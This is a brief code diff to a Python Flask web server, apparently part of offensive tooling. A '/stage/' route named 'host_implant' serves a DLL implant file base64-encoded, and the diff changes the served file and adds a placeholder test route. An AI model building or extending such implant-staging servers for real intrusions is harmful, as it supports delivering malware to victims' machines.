@@ -92,8 +92,12 @@ class WebServer:
 
     @app.route("/stage/", methods=["GET"])
     def host_implant():
-        f = open("./poc.dll", "rb").read()
+        f = open("./std.dll", "rb").read()
         return b64encode(f)
+
+    @app.route("/test/", methods=["GET"])
+    def test():
+        return "what?"
 
     @staticmethod
     def run():
